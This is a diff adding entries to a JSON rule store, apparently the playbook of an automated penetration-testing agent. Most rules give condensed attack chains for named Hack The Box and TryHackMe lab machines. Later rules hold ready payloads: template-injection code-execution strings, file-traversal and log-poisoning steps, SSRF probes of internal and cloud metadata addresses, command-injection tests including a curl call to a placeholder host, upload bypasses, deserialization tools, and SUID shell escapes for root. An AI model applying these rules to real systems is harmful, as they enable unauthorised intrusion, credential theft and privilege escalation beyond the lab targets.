+      "success_rate": 0.0
+    },
+    "htb_scriptkiddie_foothold": {
+      "id": "htb_scriptkiddie_foothold",
+      "if_condition": "Target matches HTB ScriptKiddie (linux/easy) pattern",
+      "then_action": "msfvenom APK injection (CVE-2020-7384) \u2192 user shell",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_scriptkiddie"
+      ],
+      "created_at": 1771203864.3534496,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_scriptkiddie_privesc": {
+      "id": "htb_scriptkiddie_privesc",
+      "if_condition": "User shell on linux matching HTB ScriptKiddie",
+      "then_action": "sudo msfconsole \u2192 shell escape \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_scriptkiddie"
+      ],
+      "created_at": 1771203864.363386,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_spectra_foothold": {
+      "id": "htb_spectra_foothold",
+      "if_condition": "Target matches HTB Spectra (linux/easy) pattern",
+      "then_action": "WordPress default creds from testing DB config \u2192 admin \u2192 theme editor \u2192 shell",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_spectra"
+      ],
+      "created_at": 1771203864.3728058,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_spectra_privesc": {
+      "id": "htb_spectra_privesc",
+      "if_condition": "User shell on linux matching HTB Spectra",
+      "then_action": "initctl writable conf \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_spectra"
+      ],
+      "created_at": 1771203864.3814175,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_armageddon_foothold": {
+      "id": "htb_armageddon_foothold",
+      "if_condition": "Target matches HTB Armageddon (linux/easy) pattern",
+      "then_action": "Drupal 7 Drupalgeddon2 \u2192 apache shell \u2192 MySQL hash crack \u2192 user",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_armageddon"
+      ],
+      "created_at": 1771203864.3903098,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_armageddon_privesc": {
+      "id": "htb_armageddon_privesc",
+      "if_condition": "User shell on linux matching HTB Armageddon",
+      "then_action": "sudo snap install \u2192 crafted snap \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_armageddon"
+      ],
+      "created_at": 1771203864.398551,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_pit_foothold": {
+      "id": "htb_pit_foothold",
+      "if_condition": "Target matches HTB Pit (linux/medium) pattern",
+      "then_action": "SNMP walk \u2192 find SeedDMS path \u2192 exploit upload \u2192 shell",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_pit"
+      ],
+      "created_at": 1771203864.4065883,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_pit_privesc": {
+      "id": "htb_pit_privesc",
+      "if_condition": "User shell on linux matching HTB Pit",
+      "then_action": "ACL cockpit \u2192 user script \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_pit"
+      ],
+      "created_at": 1771203864.4142444,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_cap_foothold": {
+      "id": "htb_cap_foothold",
+      "if_condition": "Target matches HTB Cap (linux/easy) pattern",
+      "then_action": "IDOR on PCAP download \u2192 cleartext FTP creds \u2192 SSH",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_cap"
+      ],
+      "created_at": 1771203864.4216878,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_cap_privesc": {
+      "id": "htb_cap_privesc",
+      "if_condition": "User shell on linux matching HTB Cap",
+      "then_action": "Python cap_setuid capability \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_cap"
+      ],
+      "created_at": 1771203864.429895,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_sau_foothold": {
+      "id": "htb_sau_foothold",
+      "if_condition": "Target matches HTB Sau (linux/easy) pattern",
+      "then_action": "Request-Baskets SSRF \u2192 internal Maltrail RCE",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_sau"
+      ],
+      "created_at": 1771203864.4377027,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_sau_privesc": {
+      "id": "htb_sau_privesc",
+      "if_condition": "User shell on linux matching HTB Sau",
+      "then_action": "systemctl pager \u2192 sudo -l \u2192 less \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_sau"
+      ],
+      "created_at": 1771203864.4439166,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_monitorstwo_foothold": {
+      "id": "htb_monitorstwo_foothold",
+      "if_condition": "Target matches HTB MonitorsTwo (linux/medium) pattern",
+      "then_action": "Cacti 1.2.22 RCE \u2192 Docker container \u2192 escape via SUID",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_monitorstwo"
+      ],
+      "created_at": 1771203864.4513996,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_monitorstwo_privesc": {
+      "id": "htb_monitorstwo_privesc",
+      "if_condition": "User shell on linux matching HTB MonitorsTwo",
+      "then_action": "CVE-2021-41091 Docker overlay \u2192 host root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_monitorstwo"
+      ],
+      "created_at": 1771203864.4588704,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_keeper_foothold": {
+      "id": "htb_keeper_foothold",
+      "if_condition": "Target matches HTB Keeper (linux/easy) pattern",
+      "then_action": "Request Tracker default creds \u2192 user info \u2192 KeePass crash dump \u2192 master password",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_keeper"
+      ],
+      "created_at": 1771203864.4664226,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_keeper_privesc": {
+      "id": "htb_keeper_privesc",
+      "if_condition": "User shell on linux matching HTB Keeper",
+      "then_action": "KeePass 2.x CVE-2023-32784 memory dump \u2192 SSH key",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_keeper"
+      ],
+      "created_at": 1771203864.474821,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_codify_foothold": {
+      "id": "htb_codify_foothold",
+      "if_condition": "Target matches HTB Codify (linux/easy) pattern",
+      "then_action": "vm2 sandbox escape \u2192 user shell \u2192 SQLite hash \u2192 pattern brute",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_codify"
+      ],
+      "created_at": 1771203864.4825978,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_codify_privesc": {
+      "id": "htb_codify_privesc",
+      "if_condition": "User shell on linux matching HTB Codify",
+      "then_action": "sudo /opt/scripts/mysql-backup.sh \u2192 wildcard injection \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_codify"
+      ],
+      "created_at": 1771203864.4902263,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_surveillance_foothold": {
+      "id": "htb_surveillance_foothold",
+      "if_condition": "Target matches HTB Surveillance (linux/medium) pattern",
+      "then_action": "Craft CMS CVE-2023-41892 RCE \u2192 user \u2192 ZoneMinder SQLi \u2192 shell",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_surveillance"
+      ],
+      "created_at": 1771203864.497328,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_surveillance_privesc": {
+      "id": "htb_surveillance_privesc",
+      "if_condition": "User shell on linux matching HTB Surveillance",
+      "then_action": "sudo /usr/bin/zmupdate.pl \u2192 command injection \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_surveillance"
+      ],
+      "created_at": 1771203864.5065506,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_busqueda_foothold": {
+      "id": "htb_busqueda_foothold",
+      "if_condition": "Target matches HTB Busqueda (linux/easy) pattern",
+      "then_action": "Searchor 2.4.0 eval injection \u2192 user shell \u2192 gitconfig creds",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_busqueda"
+      ],
+      "created_at": 1771203864.5147908,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_busqueda_privesc": {
+      "id": "htb_busqueda_privesc",
+      "if_condition": "User shell on linux matching HTB Busqueda",
+      "then_action": "sudo /opt/scripts/system-checkup.sh \u2192 relative path docker-inspect \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_busqueda"
+      ],
+      "created_at": 1771203864.5236337,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_headless_foothold": {
+      "id": "htb_headless_foothold",
+      "if_condition": "Target matches HTB Headless (linux/easy) pattern",
+      "then_action": "XSS \u2192 steal admin cookie \u2192 command injection in dashboard",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_headless"
+      ],
+      "created_at": 1771203864.5322993,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_headless_privesc": {
+      "id": "htb_headless_privesc",
+      "if_condition": "User shell on linux matching HTB Headless",
+      "then_action": "sudo /usr/bin/syscheck \u2192 relative path in script \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_headless"
+      ],
+      "created_at": 1771203864.540646,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_perfection_foothold": {
+      "id": "htb_perfection_foothold",
+      "if_condition": "Target matches HTB Perfection (linux/easy) pattern",
+      "then_action": "SSTI in Ruby/ERB \u2192 URL encoded newline bypass \u2192 user shell",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_perfection"
+      ],
+      "created_at": 1771203864.548786,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_perfection_privesc": {
+      "id": "htb_perfection_privesc",
+      "if_condition": "User shell on linux matching HTB Perfection",
+      "then_action": "Susan hash in DB + password rules \u2192 sudo su \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_perfection"
+      ],
+      "created_at": 1771203864.5572128,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_wifinetictwo_foothold": {
+      "id": "htb_wifinetictwo_foothold",
+      "if_condition": "Target matches HTB WifineticTwo (linux/medium) pattern",
+      "then_action": "OpenPLC default creds \u2192 code injection \u2192 shell",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_wifinetictwo"
+      ],
+      "created_at": 1771203864.5661807,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_wifinetictwo_privesc": {
+      "id": "htb_wifinetictwo_privesc",
+      "if_condition": "User shell on linux matching HTB WifineticTwo",
+      "then_action": "WPS Pixie Dust \u2192 WiFi AP creds \u2192 internal access \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_wifinetictwo"
+      ],
+      "created_at": 1771203864.5746157,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_boardlight_foothold": {
+      "id": "htb_boardlight_foothold",
+      "if_condition": "Target matches HTB BoardLight (linux/easy) pattern",
+      "then_action": "Dolibarr CMS default creds \u2192 PHP reverse shell \u2192 user",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_boardlight"
+      ],
+      "created_at": 1771203864.5828743,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_boardlight_privesc": {
+      "id": "htb_boardlight_privesc",
+      "if_condition": "User shell on linux matching HTB BoardLight",
+      "then_action": "Enlightenment SUID (CVE-2022-37706) \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_boardlight"
+      ],
+      "created_at": 1771203864.589653,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_twomillion_foothold": {
+      "id": "htb_twomillion_foothold",
+      "if_condition": "Target matches HTB TwoMillion (linux/easy) pattern",
+      "then_action": "API invite code generation \u2192 register \u2192 command injection \u2192 user",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_twomillion"
+      ],
+      "created_at": 1771203864.5971553,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_twomillion_privesc": {
+      "id": "htb_twomillion_privesc",
+      "if_condition": "User shell on linux matching HTB TwoMillion",
+      "then_action": "OverlayFS CVE-2023-0386 \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_twomillion"
+      ],
+      "created_at": 1771203864.6040976,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_analytics_foothold": {
+      "id": "htb_analytics_foothold",
+      "if_condition": "Target matches HTB Analytics (linux/easy) pattern",
+      "then_action": "Metabase pre-auth RCE (CVE-2023-38646) \u2192 Docker container",
+      "parameters_template": {},
+      "confidence": 0.87,
+      "evidence_refs": [
+        "htb_analytics"
+      ],
+      "created_at": 1771203864.6125567,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "htb_analytics_privesc": {
+      "id": "htb_analytics_privesc",
+      "if_condition": "User shell on linux matching HTB Analytics",
+      "then_action": "OverlayFS CVE-2023-2640/CVE-2023-32629 (GameOver(lay)) \u2192 host root",
+      "parameters_template": {},
+      "confidence": 0.85,
+      "evidence_refs": [
+        "htb_analytics"
+      ],
+      "created_at": 1771203864.6205578,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_blue_chain": {
+      "id": "thm_blue_chain",
+      "if_condition": "Target matches THM Blue pattern: eternal-blue, smb",
+      "then_action": "EternalBlue MS17-010 \u2192 SYSTEM \u2192 Direct SYSTEM",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_blue"
+      ],
+      "created_at": 1771203864.6283448,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_kenobi_chain": {
+      "id": "thm_kenobi_chain",
+      "if_condition": "Target matches THM Kenobi pattern: samba, proftpd, suid",
+      "then_action": "Samba share enumeration \u2192 ProFTPD 1.3.5 mod_copy \u2192 SSH key theft \u2192 SUID /usr/bin/menu \u2192 PATH injection",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_kenobi"
+      ],
+      "created_at": 1771203864.6360137,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_steel_mountain_chain": {
+      "id": "thm_steel_mountain_chain",
+      "if_condition": "Target matches THM Steel Mountain pattern: hfs, unquoted-path",
+      "then_action": "HFS 2.3 RCE \u2192 user shell \u2192 Unquoted service path + PowerUp.ps1 \u2192 SYSTEM",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_steel mountain"
+      ],
+      "created_at": 1771203864.644111,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_alfred_chain": {
+      "id": "thm_alfred_chain",
+      "if_condition": "Target matches THM Alfred pattern: jenkins, token-impersonation",
+      "then_action": "Jenkins default creds \u2192 Groovy script console \u2192 shell \u2192 Token impersonation (incognito) \u2192 SYSTEM",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_alfred"
+      ],
+      "created_at": 1771203864.6521661,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_hackpark_chain": {
+      "id": "thm_hackpark_chain",
+      "if_condition": "Target matches THM HackPark pattern: blogengine, autologon, scheduler",
+      "then_action": "BlogEngine.NET \u2192 authenticated RCE \u2192 shell \u2192 WinPEAS \u2192 AutoLogon creds \u2192 WindowsScheduler \u2192 SYSTEM",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_hackpark"
+      ],
+      "created_at": 1771203864.6601841,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_game_zone_chain": {
+      "id": "thm_game_zone_chain",
+      "if_condition": "Target matches THM Game Zone pattern: sqli, webmin, ssh-tunnel",
+      "then_action": "SQLi login bypass \u2192 SQLMap database dump \u2192 SSH creds \u2192 SSH tunnel \u2192 Webmin CVE \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_game zone"
+      ],
+      "created_at": 1771203864.6669717,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_skynet_chain": {
+      "id": "thm_skynet_chain",
+      "if_condition": "Target matches THM Skynet pattern: samba, squirrelmail, rfi",
+      "then_action": "Samba \u2192 SquirrelMail creds \u2192 Cuppa CMS RFI \u2192 shell \u2192 Cron tar wildcard injection \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_skynet"
+      ],
+      "created_at": 1771203864.673769,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_daily_bugle_chain": {
+      "id": "thm_daily_bugle_chain",
+      "if_condition": "Target matches THM Daily Bugle pattern: joomla, sqli, sudo-yum",
+      "then_action": "Joomla CVE-2017-8917 SQLi \u2192 admin hash \u2192 template RCE \u2192 yum sudo NOPASSWD \u2192 GTFOBins \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_daily bugle"
+      ],
+      "created_at": 1771203864.6820862,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_overpass_chain": {
+      "id": "thm_overpass_chain",
+      "if_condition": "Target matches THM Overpass pattern: cookie-manipulation, cron-hosts",
+      "then_action": "ROT13 'encrypted' cookie \u2192 admin \u2192 SSH key \u2192 Cron fetches from /etc/hosts controlled URL \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_overpass"
+      ],
+      "created_at": 1771203864.6906054,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_relevant_chain": {
+      "id": "thm_relevant_chain",
+      "if_condition": "Target matches THM Relevant pattern: smb, iis, printspoofer",
+      "then_action": "SMB writable share in IIS webroot \u2192 ASPX shell \u2192 PrintSpoofer / SEImpersonate \u2192 SYSTEM",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_relevant"
+      ],
+      "created_at": 1771203864.6993334,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_internal_chain": {
+      "id": "thm_internal_chain",
+      "if_condition": "Target matches THM Internal pattern: wordpress, docker, jenkins",
+      "then_action": "WordPress \u2192 admin \u2192 theme editor \u2192 shell \u2192 Jenkins on Docker \u2192 Docker \u2192 host mount \u2192 credentials \u2192 SSH root",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_internal"
+      ],
+      "created_at": 1771203864.70789,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_mr_robot_chain": {
+      "id": "thm_mr_robot_chain",
+      "if_condition": "Target matches THM Mr Robot pattern: wordpress, suid-nmap",
+      "then_action": "WordPress \u2192 Dirbuster finds /key-1 and /fsocity.dic \u2192 WP brute \u2192 theme editor \u2192 SUID nmap interactive \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_mr robot"
+      ],
+      "created_at": 1771203864.717047,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_retro_chain": {
+      "id": "thm_retro_chain",
+      "if_condition": "Target matches THM Retro pattern: wordpress, rdp, cve",
+      "then_action": "WordPress \u2192 author post reveals creds \u2192 RDP login \u2192 CVE-2017-0213 COM exploit \u2192 SYSTEM",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_retro"
+      ],
+      "created_at": 1771203864.7257085,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_brainpan_chain": {
+      "id": "thm_brainpan_chain",
+      "if_condition": "Target matches THM Brainpan pattern: bof, sudo-man",
+      "then_action": "Buffer overflow in custom binary on port 9999 \u2192 shell \u2192 sudo anansi_util (manual) \u2192 man page shell escape \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_brainpan"
+      ],
+      "created_at": 1771203864.734244,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_wonderland_chain": {
+      "id": "thm_wonderland_chain",
+      "if_condition": "Target matches THM Wonderland pattern: web, steganography, python-library-hijack",
+      "then_action": "Rabbit hole web app \u2192 hidden creds in page source \u2192 SSH \u2192 Python library hijacking \u2192 PATH manipulation \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_wonderland"
+      ],
+      "created_at": 1771203864.7424796,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_tomghost_chain": {
+      "id": "thm_tomghost_chain",
+      "if_condition": "Target matches THM Tomghost pattern: tomcat, ajp, ghostcat",
+      "then_action": "Ghostcat (CVE-2020-1938) AJP \u2192 read WEB-INF/cred.xml \u2192 SSH \u2192 PGP key crack \u2192 sudo zip \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_tomghost"
+      ],
+      "created_at": 1771203864.7498975,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_year_of_the_rabbit_chain": {
+      "id": "thm_year_of_the_rabbit_chain",
+      "if_condition": "Target matches THM Year of the Rabbit pattern: ftp, brainfuck, sudo-vi",
+      "then_action": "FTP anon \u2192 hidden dir \u2192 CSS comment hints \u2192 Brainfuck encoded creds \u2192 sudo vi \u2192 :!/bin/bash \u2192 root",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_year of the rabbit"
+      ],
+      "created_at": 1771203864.7570696,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_dogcat_chain": {
+      "id": "thm_dogcat_chain",
+      "if_condition": "Target matches THM Dogcat pattern: lfi, log-poisoning, docker-escape",
+      "then_action": "PHP LFI \u2192 log poisoning \u2192 shell \u2192 Docker escape \u2192 Docker container \u2192 host /opt/backups mount \u2192 escape",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_dogcat"
+      ],
+      "created_at": 1771203864.764898,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_anthem_chain": {
+      "id": "thm_anthem_chain",
+      "if_condition": "Target matches THM Anthem pattern: osint, rdp, hidden-files",
+      "then_action": "OSINT \u2192 poem reveals admin name \u2192 password in robots.txt \u2192 RDP \u2192 Hidden admin password in C:\\backup \u2192 admin login",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_anthem"
+      ],
+      "created_at": 1771203864.7757483,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "thm_rootme_chain": {
+      "id": "thm_rootme_chain",
+      "if_condition": "Target matches THM RootMe pattern: file-upload-bypass, suid-python",
+      "then_action": "PHP file upload bypass (phtml extension) \u2192 shell \u2192 SUID python \u2192 python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "thm_rootme"
+      ],
+      "created_at": 1771203864.7908142,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "web_ssti_detection": {
+      "id": "web_ssti_detection",
+      "if_condition": "Web application with template rendering, user input reflected in page",
+      "then_action": "Test {{7*7}} and ${7*7} in all input fields. If 49 appears \u2192 SSTI confirmed. Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. Twig: {{['id']|filter('system')}}. ERB: <%=system('id')%>",
+      "parameters_template": {},
+      "confidence": 0.92,
+      "evidence_refs": [
+        "web_patterns"
+      ],
+      "created_at": 1771203864.8120124,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "web_lfi_chain": {
+      "id": "web_lfi_chain",
+      "if_condition": "Web app includes files via parameter (page=, file=, include=, template=, path=)",
+      "then_action": "Test ../../../../etc/passwd. If filtered: try ....//....//etc/passwd, php://filter/convert.base64-encode/resource=index.php for source code, Log poisoning: inject PHP in User-Agent then include /var/log/apache2/access.log",
+      "parameters_template": {},
+      "confidence": 0.93,
+      "evidence_refs": [
+        "web_patterns"
+      ],
+      "created_at": 1771203864.830468,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "web_ssrf_internal": {
+      "id": "web_ssrf_internal",
+      "if_condition": "Web app fetches external URLs (image upload by URL, webhook, URL preview, PDF generator)",
+      "then_action": "Test http://127.0.0.1:PORT/ for internal services. Try common ports: 8080, 3000, 9200, 5000, 6379, 27017. Bypass filters with: http://0x7f000001, http://[::], DNS rebinding. Cloud: http://169.254.169.254/",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "web_patterns"
+      ],
+      "created_at": 1771203864.8451016,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "web_command_injection": {
+      "id": "web_command_injection",
+      "if_condition": "Web app runs system commands (ping, DNS lookup, file operations, network tools)",
+      "then_action": "Test: ;id, |id, $(id), `id`. Blind: ;sleep 5, |curl http://LHOST. Filter bypass: ${IFS} for spaces, {cat,/etc/passwd} for both, base64 encoded payloads, %0a for newlines",
+      "parameters_template": {},
+      "confidence": 0.94,
+      "evidence_refs": [
+        "web_patterns"
+      ],
+      "created_at": 1771203864.8596416,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "web_file_upload_bypass": {
+      "id": "web_file_upload_bypass",
+      "if_condition": "Web app has file upload functionality",
+      "then_action": "Try: shell.php.jpg (double ext), shell.phtml/.php3/.php5/.phar (alt ext), change Content-Type to image/jpeg, GIF89a<?php header (magic bytes), .htaccess upload with AddType application/x-httpd-php .txt, polyglot JPEG with PHP in EXIF. Null byte: shell.php%00.jpg (old PHP)",
+      "parameters_template": {},
+      "confidence": 0.92,
+      "evidence_refs": [
+        "web_patterns"
+      ],
+      "created_at": 1771203864.869423,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "web_deserialization": {
+      "id": "web_deserialization",
+      "if_condition": "Application uses Java (rO0AB/ACED), PHP (O:4:), Python (pickle), or .NET (ViewState) serialization",
+      "then_action": "Java: ysoserial CommonsCollections1 'CMD'. PHP: phpggc Laravel/RCE1 system CMD. Python: craft pickle payload with __reduce__. .NET: ysoserial.net",
+      "parameters_template": {},
+      "confidence": 0.88,
+      "evidence_refs": [
+        "web_patterns"
+      ],
+      "created_at": 1771203864.8791027,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "web_api_exploitation": {
+      "id": "web_api_exploitation",
+      "if_condition": "REST/GraphQL API endpoints discovered",
+      "then_action": "Test IDOR by changing numeric IDs. Mass assignment: add admin=true/role=admin to POST. JWT: try alg=none, crack weak secret with hashcat -m 16500. GraphQL: query {__schema{types{name,fields{name}}}} for introspection. Check rate limiting, parameter pollution, verb tampering (GET\u2192PUT)",
+      "parameters_template": {},
+      "confidence": 0.9,
+      "evidence_refs": [
+        "web_patterns"
+      ],
+      "created_at": 1771203864.8872375,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_suid_nmap": {
+      "id": "linux_suid_nmap",
+      "if_condition": "SUID binary found: nmap",
+      "then_action": "nmap --interactive \u2192 !sh",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203864.895621,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_suid_vim": {
+      "id": "linux_suid_vim",
+      "if_condition": "SUID binary found: vim",
+      "then_action": "vim -c ':!/bin/bash'",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203864.9046497,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_suid_nano": {
+      "id": "linux_suid_nano",
+      "if_condition": "SUID binary found: nano",
+      "then_action": "nano \u2192 Ctrl+R Ctrl+X \u2192 reset; bash 1>&0 2>&0",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203864.9127536,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_suid_find": {
+      "id": "linux_suid_find",
+      "if_condition": "SUID binary found: find",
+      "then_action": "find . -exec /bin/bash -p \\;",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203864.9203858,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_suid_bash": {
+      "id": "linux_suid_bash",
+      "if_condition": "SUID binary found: bash",
+      "then_action": "bash -p",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203864.9286351,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_suid_python": {
+      "id": "linux_suid_python",
+      "if_condition": "SUID binary found: python",
+      "then_action": "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+      "parameters_template": {},
+      "confidence": 0.95,
+      "evidence_refs": [
+        "gtfobins"
+      ],
+      "created_at": 1771203864.9371874,
+      "usage_count": 0,
+      "success_rate": 0.0
+    },
+    "linux_suid_perl": {
+      "id": "linux_suid_perl",
+      "if_condition": "SUID binary found: perl",
